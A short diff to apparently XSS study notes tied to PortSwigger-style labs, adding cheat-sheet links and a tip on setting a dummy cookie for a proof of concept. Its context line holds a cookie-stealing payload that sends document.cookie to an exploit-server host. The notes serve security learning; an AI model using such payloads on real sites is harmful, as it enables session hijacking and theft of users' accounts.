@@ -139,6 +139,11 @@ document.location='https://exploit.exploit-server.net/cookies?c='+document.cooki
 
 + [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 + [PayloadsAllTheThings (XSS)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-htmlapplications)  
+>Set simple unsecure cookie in browser dev tools to do POC.  
+
+```JavaScript
+document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
+```
   
 ### Methodology to identify allowed XSS Tags  
 
